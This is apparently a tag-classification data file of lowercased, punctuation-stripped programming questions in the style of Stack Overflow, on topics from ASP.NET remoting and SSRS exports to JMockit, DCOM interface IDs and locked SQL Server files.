10670,asynchronous remoting calls we have a remoting singleton server running in a separate windows service lets call her remotingservice the clients of the remotingservice are aspnet instances many manycurrently the clients remoting call remotingservice and blocks while the remotingservice call is serviced however the remoting service is getting complicated enough with more rpc calls and complex algorithms that the aspnet worker threads are blocked for a significantly long time 45 secondsaccording to this msdn article doing this will not scale well because an aspnet worker thread is blocked for each remoting rpc it advises switching to async handlers to free up aspnet worker threads  the purpose of an asynchronous handler  is to free up an aspnet thread pool  thread to service additional requests  while the handler is processing the  original requestthis seems fine except the remoting call still takes up a thread from the thread poolis this the same thread pool as the aspnet worker threads how should i go about turning my remoting singleton server into an async system such that i free up my aspnet worker threadsive probably missed out some important information please let me know if there is anything else you need to know to answer the question,c#

10860,data layer best practices i am in the middle of a discussion with a colleague about the best way to implement the data layer in a new applicationone viewpoint is that the data layer should be aware of business objects our own classes that represent an entity and be able to work with that object natively  the opposing viewpoint is that the data layer should be objectagnostic and purely handle simple data types strings bools dates etci can see that both approaches may be valid but my own viewpoint is that i prefer the former  that way if the data storage medium changes the business layer doesnt necessarily have to change to accommodate the new data layer  it would therefore be a trivial thing to change from a sql data store to a serialized xml filesystem storemy colleagues point of view is that the data layer shouldnt have to know about object definitions and that as long as the data is passed about appropriately that is enough  now i know that this is one of those questions that has the potential to start a religious war but id appreciate any feedback from the community on how you approach such things  tia,.net

15310,optimizing the pdf export of huge reports in sql reporting services 2005 first off i understand that it is a horrible idea to run extremely largelong running reports i am aware that microsoft has a rule of thumb stating that a ssrs report should take no longer than 30 seconds to execute  however sometimes gargantuan reports are a preferred evil due to external forces such complying with state lawsat my place of employment we have an aspnet 20 app that we have migrated from crystal reports to ssrs due to the large user base and complex reporting ui requirements we have a set of screens that accepts user inputted parameters and creates schedules to be run over night since the application supports multiple reporting frameworks we do not use the schedulingsnapshot facilities of ssrs all of the reports in the system are generated by a scheduled console app which takes user entered parameters and generates the reports with the corresponding reporting solutions the reports were created with in the case of ssrs reports the console app generates the ssrs reports and exports them as pdfs via the ssrs web service api so far ssrs has been much easier to deal with than crystal with the exception of a certain 25000 page report that we have recently converted from crystal reports to ssrs the ssrs server is a 64bit 2003 server with 32 gigs of ram running ssrs 2005 all of our smaller reports work fantastically but we are having trouble with our larger reports such as this one  unfortunately we cant seem to generate the aforemention report through the web service api the following error occurs roughly 3035 minutes into the generationexportexception message the underlying connection was closed an unexpected error occurred on a receivethe web service call is something im sure you all have seen before  data  rsrenderthisreportpath thisexportformat null deviceinfo   selectedparameters null null out encoding out mimetype out usedparameters    out warnings out streamidsthe odd thing is that this report will runrenderexport if the report is run directly on the reporting server using the report manager the proc that produces the data for the report runs for about 5 minutes the report renders in ssrs native format in the browserviewer after about 12 minutes exporting to pdf through the browserviewer in the report manager takes an additional 55 minutes this works reliably and it produces a whopping 103gb pdfhere are some of the more obvious things ive tried to get the report working via the web service api  set the httpruntime executiontimeoutvalue to 3 hours on the reportserverdisabled http keep alives on the report serverincreased the script timeout on the report serverset the report to never time out on the serverset the report timeout to several hours on the client call  from the tweaks i have tried i am fairly comfortable saying that any timeout issues have been eliminated based off of my research of the error message i believe that the web service api does not send chunked responses by default this means that it tries to send all 13gb over the wire in one response at a certain point iis throws in the towel unfortunately the api abstracts away web service configuration so i cant seem to find a way to enable response chunking does anyone know of anyway to reduceoptimize the pdf export phase and or the size of the pdf without lowering the total page countis there a way to turn on response chunking for ssrsdoes anyone else have any other theories as to why this runs on the server but not through the apiedit after reading kcrumleys post i began to take a look at the average page size by taking file size  page count interestingly enough on smaller reports the math works out so that each page is roughly 5k interestingly when the report gets larger this average increases an 8000 page report for example is averaging over 40kpage very odd i will also add that the number of records per page is set except for the last page in each grouping so its not a case where some pages have more records than another ,sql-server

24270,whats the point of oop as far as i can tell in spite of the countless millions or billions spent on oop education languages and tools oop has not improved developer productivity or software reliability nor has it reduced development costs few people use oop in any rigorous sense few people adhere to or understand principles such as lsp there seems to be little uniformity or consistency to the approaches that people take to modelling problem domains  all too often the class is used simply for its syntactic sugar it puts the functions for a record type into their own little namespaceive written a large amount of code for a wide variety of applications although there have been places where true substitutable subtyping played a valuable role in the application these have been pretty exceptional in general though much lip service is given to talk of reuse the reality is that unless a piece of code does exactly what you want it to do theres very little costeffective reuse  its extremely hard to design classes to be extensible in the right way and so the cost of extension is normally so great that reuse simply isnt worthwhilein many regards this doesnt surprise me  the real world isnt oo and the idea implicit in oothat we can model things with some class taxonomyseems to me very fundamentally flawed i can sit on a table a tree stump a car bonnet someones lapbut not one of those isa chair  even if we move to more abstract domains oo modelling is often difficult counterintuitive and ultimately unhelpful consider the classic examples of circlesellipses or squaresrectanglesso what am i missing here wheres the value of oop and why has all the time and money failed to make software any better,language-agnostic

41580,should i keep registering a failure im working on an automated regression test suite for an app which i maintain  while developing the automated regression test i ran across some behavior thats almost certainly a bug  so for now ive modified the automated regression test to not register a failureits deliberately allowing this bad behavior to go by i mean  so i am interested in the opinions of others on this site  obviously ill add a bug to our defect tracking to make sure this error behavior gets fixed  but are there any compelling reasons either way to either change the regression test to constantly indicate failure or leave the regression test broken and not have a failure until we can get to fixing the defective behavior  i think of this as a 6 of one and a halfdozen of the other type of question but i ask here because i thought others may see it differentlypaul tomblinjust to be clearive never considered removing the test i was simply considering modifying the passfail condition to allow for the failure without it being thrown up in my face every time i run the test im a little concerned about repeated failures from known causes eventually getting treated like warnings in c  i know developers who see warnings in their c code and simply ignore them because they think theyre just useless noise  im afraid leaving a known failure in the regression suite might cause people to start ignoring other possibly more important failures btw lest i be misunderstood i consider warnings in c to be an important aid in crafting strong code but judging from other c developers ive met i think im in the minority,testing

54760,unfiltering nspasteboard is there a way to unfilter an nspasteboard for what the source application specifically declared it would provideim attempting to serialize pasteboard data in my application  when another application places an rtf file on a pasteboard and then i ask for the available types i get eleven different flavors of said rtf everything from the original rtf to plain strings to dyn values  saving off all that data into a plist or raw data on disk isnt usually a problem as its  pretty small but when an image of any considerable size is placed on the pasteboard the resulting output can be tens of times larger than the source data with multiple flavors of tiff and pict data being made available via filteringid like to just be able to save off what the original app made available if possiblejohn you are far more observant than myself or the gentleman i work with whos been doing mac programming since dinosaurs roamed the earth  neither of us ever noticed the text you highlighted and ive not a clue why  starting too long at the problem apparentlyand while i accepted your answer as the correct answer it doesnt exactly answer my original question  what i was looking for was a way to identify flavors that can become  other flavors simply by placing them on the pasteboard and to know which of these types were originally offered by the provider  while walking the types list will get me the preferred order for the application that provided them it wont tell me which ones i can safely ignore as theyll be recreated when i refill the pasteboard laterive come to the conclusion that there isnt a good way to do this  nspasteboard declaredtypesfromowner would be fabulous but it doesnt exist,cocoa

57730,best build process solution to manage build versions i run a rather complex project with several independent applications these use however a couple of shared components so i have a source tree looking something like the belowmy project application ashared1shared2 application b application call applications have their own msbuild script that builds the project and all the shared resources it needs i also run these builds on a cruisecontrol controlled continuous integration build server when the applications are deployed they are deployed on several servers to distribute load this means that its extremely important to keep track of what buildrevision is deployed on each of the different servers we need to have the current version in the dll version for example 10068 its equally important to be able to recreate a revisionbuild that been built to be able to roll back if something didnt work out as intended o yes that happends  today were using sourcesafe for source control but that possible to change if we could present good reasons for that ss its actually working ok for us so far another principle that we try to follow is that its only code that been build and tested by the integration server that we deploy further crusiecontrol build labels solutionwe had several ideas on solving the above the first was to have the continuous integration server build and locally deploy the project and test it it does that now as you probably know a successful build in cruisecontrol generates a build label and i guess we somehow could use that to set the dll version of our executables so build label 35 would create a dll like 10035  the idea was also to use this build label to label the complete source tree then we probably could check out by that label and recreate the build later on the reason for labeling the complete tree is to include not only the actual application code thats in one place in the source tree but also all the shared items thats in different places in the tree so a successful build of application a would label to whole tree with label applicationa35 for example there might however be an issue when trying to recreate this build and setting the dll version before deploying as we then dont have access to the cruisecontrol generated build label anymore if all crusiecontrol build labels were unique for all the projects we could use only the number for labeling but thats not the case both application a and b could at the same time be on build 35 so we have to include the application name in the label hence sourcesafe label application35 how can i then recreate build 34 and set 10034 to the dll version numbers once we built build 35revision number solutionsomeone told me that subversion for example creates a revision number for the entire source tree on every check in  is this the case has sourcesafe something similar if this is correct the idea is then to grab that revision number when getting latest and build on the cruisecontrol server the revision number could then be used to set the dll version number to for example 1005678 i guess we could then get this specific revision for the subversion if needed and that then would include that application and all the shared items to be able to recreate a specific version from the past would that work and could this also be achived using sourcesafesummarizeso the two main requirements arebe able to track buildrevision number of the build and deployed dllbe able to rebuild a past revisionbuild set the old buildrevision number on the executables of that build to comply with requirement 1so how would you solve this what would be your preferred approach and how would you solve it or do you have a totally different idea pleased give detailed answers bonus question what are the difference between a revision number and a build number and when would one really need both,version-control

58000,building flex projects in antnant we have a recurring problem at my company with build breaks in our flex projects the problem primarily occurs because the build that the developers do on their local machines is fundamentally different from the build that occurs on the build machine the devs are building the projects using flexbuildereclipse and the build machine is using the command line compilers inevitably the projectnameconfigxml andor the batch file that runs the build get out of sync with the project files used by eclipse so the the build succeeds on the devs machine but fails on the build machinewe started down the path of writing a utility program to convert flexbuilders project files into a projectnameconfigxml file but its a undocumented and b a horrible hackive looked into the dumpconfig switch to get the config files but this has a couple of problems 1 the generated config file has absolute paths which doesnt work in our environment some developers use macs some windows machines and 2 only works right when run from the ide so cant be build into the build processtomorrow we are going to discuss a couple of options neither of which im terribly fond ofa add a post checkin event to subversion to remove these absolute references or b add a prebuild process that removes the absolute referencei cant believe that we are the first group of developers to run across this issue but i cant find any good solutions on google how have other groups dealt with this problem,flex

58190,are clr stored procedures preferred over tsql stored procedures in sql 2005 my current view is no prefer transact sql stored procedures because they are a lighter weight and possibly higher performing option while clr procedures allow developers to get up to all sorts of mischiefhowever recently i have needed to debug some very poorly written tsql stored procs  as usual i found many of the problems due to the original developer developer having no real tsql experience they were  aspnet  c focusedso using clr procedures would firstly provide a much more familiar toolset to this type of developer and secondly the debugging and testing facilities are more powerful ie visual studio instead of sql management studio  id be very interested in hearing your experience as its seems it is not a simple choice ,.net

60830,what is wrong with using inline functions while it would be very convenient to use inline functions at some situationsare there any drawbacks with inline functionsconclusionapparently there is nothing wrong with using inline functionsbut it is worth noting the following pointsoveruse of inlining can actually make programs slower depending on a functions size inlining it can cause the code size to increase or decrease inlining a very small accessor function will usually decrease code size while inlining a very large function can dramatically increase code size on modern processors smaller code usually runs faster due to better use of the instruction cache  google guidelinesthe speed benefits of inline functions tend to diminish as the function grows in size at some point the overhead of the function call becomes small compared to the execution of the function body and the benefit is lost  sourcethere are few situations where an inline function may not workfor a function returning values if a return statement existsfor a function not returning any values if a loop switch or goto statement exists if a function is recursive sourcethe inline keyword causes a function to be inlined only if you specify the optimize option if optimize is specified whether or not inline is honored depends on the setting of the inline optimizer option by default the inline option is in effect whenever the optimizer is run if you specify optimize  you must also specify the noinline option if you want the inline keyword to be ignored source,c++

61150,mocking static blocks in java my motto for java is just because java has static blocks it doesnt mean that you should be using them jokes aside there are a lot of tricks in java that make testing a nightmare two of the most i hate are anonymous classes and static blocks we have a lot of legacy code that make use of static blocks and these are one of the annoying points in our push in writing unit tests our goal is to be able to write unit tests for classes that depend on this static initialization with minimal code changes so far my suggestion to my colleagues is to move the body of the static block into a private static method and call it staticinit this method can then be called from within the static block for unit testing another class that depends on this class could easily mock staticinit with jmockit to not do anything lets see this in examplepublic class classwithstaticinit   static     systemoutprintlnstatic initializer  will be changed topublic class classwithstaticinit   static     staticinit    private static void staticinit     systemoutprintlnstatic initialized  so that we can do the following in a junitpublic class dependentclasstest   public static class mockclasswithstaticinit     public static void staticinit         beforeclass  public static void setupbeforeclass     mockitredefinemethodsclasswithstaticinitclass mockclasswithstaticinitclass  however this solution also comes with its own problems you cant run dependentclasstest and classwithstaticinittest on the same jvm since you actually want the static block to run for classwithstaticinittestwhat would be your way of accomplishing this task or any better nonjmockit based solutions that you think would work cleaner,java

63720,does vista do stricter checking of interface ids in dcom calls the stub received bad data i hope everyone will pardon the length and narrative fashion of this question  i decided to describe the situation in some detail in my blog  i later saw joels invitation to this site and i thought id paste it here to see if anyone has any insight into the situationi wrote and now support an application that consists of a visual basic thick client speaking dcom to middle tier com components written in c using atl it runs in all eight of our offices  each office hosts a backend server that contains the com application consisting of 18 separate components and the sqlserver the sqlserver is typically on the same backend server but need not bewe recently migrated the backend server in our largest office  new york  from a msc cluster to a new virtual machine hosted on vmwares esx technology since the location of the com application had moved from the old server to a new one with a different name i had to redirect all the clients so that they activated the com application on the new server the procedure was old hat as i had done essentially the same thing for several of my smaller offices that had gone through similar infrastructure upgradesall seemed routine and on monday morning the entire office  about 1000 windows xp workstations  were running without incident on the new server but then the call came from my mobile group  there was an attorney working from home with a vpn connection that was getting a strange error after being redirected to the new servererror on filltreeview2  the stub received bad datahuh i had never seen this error message before was it the new server but all the workstations in the office were working fine i told the mobile group to switch the attorney back to the old sever which was still up and the error disappeared so what was the difference turns out this attorney was running vista at homewe dont run vista in any of our offices but we do have some attorneys that run vista at home certainly some in my new york office i do as well and ive never seen this problem to confirm that there was an issue i fired up my vista laptop pointed it to the new server and got the same error i pointed it back to the old server and it worked fine clearly there was some problem with vista and the components on the new server  a problem that did not seem to affect xp clients what could it benext stop  the application error log on my laptop this yielded more information on the errorsource        microsoftwindowsrpceventsdate          922008 115607 amevent id      10level         errorcomputer      devlaptopdescription   application has failed to complete a com call because an incorrectinterface id was passed as a parameterthe expected interface id was 0000055500000010800000aa006d2ea4 the interface id returned was 0000055600000010800000aa006d2ea4user action  contact the application vendor for updated version of the applicationthe interface ids provided the clue i needed to unravel the mystery the expected interface id identifies mdacs recordset interface  specifically version 21 of that interface the returned interface corresponds to a later version of recordset version 25 which differs from version 21 by the inclusion of one additional entry at the end of the vtable  method saveindeed my components interfaces expose many methods that pass recordset as an output parameter so were they suddenly returning a later version of recordset  with a different interface id it certainly appeared to be the case and then i thought why should it matter the vtable looks the same to clients of the older interface indeed i suspect that if we were talking about inprocess com and not dcom this apparently innocuous impedance mismatch would have been silently ignored and would have caused no issuesof course when process and machine boundaries come into play there is a proxy and a stub between the client and the server in this case i was using type library marshaling with the free threaded marshaller so there were two mysteries to solvewhy was i returning a different interface in the output parameters from methods on my new serverwhy did this affect only vista clientsas my server software was hosted on servers at each of my eight offices i decided to try pointing my vista client at all of them in sequence to see which had problems with vista and which didnt illuminating test some of the older servers still worked with vista but the newer ones did not although some of the older servers were still running windows 2000 while the newer ones were at 2003 that did not seem to be the issueafter comparing the dates of the component dlls it appeared that whenever the client pointed to servers with component dlls dated before 2003 vista was fine but those that had dlls with dates after 2003 were problematic believe it or nor there were no or at least no significant changes to the code on the server components in many years apparently the differing dates were simply due to recompiles of my components on my development machines and it appeared that one of those recompiles happened in 2003the light bulb went on when passing recordsets back from server to client my atl c components refer to the interface as recordset this symbol comes from the type library embedded within msado15dll this is the line i had in the c codeimport cprogram filescommon filessystemadomsado15dll nonamespace rename  eof adoeof dont be deceived by the 15 in msdad15dll apparently this dll has not changed name in the long series of mdac versionswhen i compiled the application back in the day the version of mdac was 21 so recordset compiled with the 21 interface id and that is the interface returned by the servers running those componentsall the clients use the com application proxy that was generated i believe back in 1999 the type library that defines my interfaces includes the lineimportlibmsado21tlbwhich explains why they expect version 21 of recordset in my methods output parameters clearly the problem was with my 2003 recompile and the fact that at that time the recordset symbol no longer corresponded to version 21 indeed recordset corresponded to the 25 version with its distinct interface id the solution for me was to change all references from recordset to recordset21 in my c code i rebuilt the components and deployed them to the new server voila  the clients seemed happy againin conclusion there are two nagging questions that remain for mewhy does the proxystub infrastructure seem to behave differently with vista clients it appears that vista is making stricter checks of the interface ids coming back from method parameters than is xphow should i have coded this differently back in 1999 so that this would not have happened interfaces are supposed to be immutable and when i recompiled under a newer version of mdac i inadvertently changed my interface because the methods now returned a different recordset interface as an output parameter as far as i know the type library back then did not have a versionspecific symbol  that is later versions of the mdac type libraries define recordset21 but that symbol was not available back in the 21 type library,windows-vista

78560,locked sql server data files i have an sql server database where i have the data and log files stored on an external usb drive  i switch the external drive between my main development machine in my office and my laptop when not in my office  i am trying to use spdetachdb and spattachdb when moving between desktop and laptop machines  i find that this works ok on the desktop  i can detach and reattach the database there no problems  but on the laptop i cannot reattach the database the database was actually originally created on the laptop and the first detach happened there  when i try to reattach on the laptop i get the following errorunable to open the physical file psqldataappmanagermdf operating system error 5 5error not foundi find a lot of references to this error all stating that it is a permissions issue  so i went down this path and made sure that the sql server service account has appropriate permissions  i have also created a new database on this same path and been able to succesfully detach and reattach it  so i am confident permissions is not the issuefurther investigation reveals that i cannot rename copy or move the data files as windows thinks they are locked  even when the sql server service is stopped  process explorer does not show up any process locking the files  how can i find out what is locking the files and unlock themi have verified that the databases do not show up in ssms  so sql server does not still think they existupdate 18092008i have tried all of the suggested answers to date with no success  however trying these suggestions has helped to clarify the situation  i can verify the followingi can successfully detach and reattach the database only when the external drive is attached to the server that a copy of the database is restored to  effectively the server where the database is created  lets call this the source server  i can move copy or rename the data and log files after detaching the database while the external drive is still attached to the source server  as soon as i move the external drive to another machine the data and log files are locked although the 2 tools that i have tried  process explorer and unlocker both find no locking handles attached to the files nb  after detaching the database i tried both stopping the sql server service and shutting down the source server prior to moving the external drive  still with no successso at this stage all that i can do to move data between desktop and laptop is to make a backup of the data onto the external drive move the external drive restore the data from the backup  works ok but takes a bit more time as the database is a reasonable size 1gb  anyway this is the only choice i have at this stage even though i was trying to avoid having to go down this path,sql-server-2005
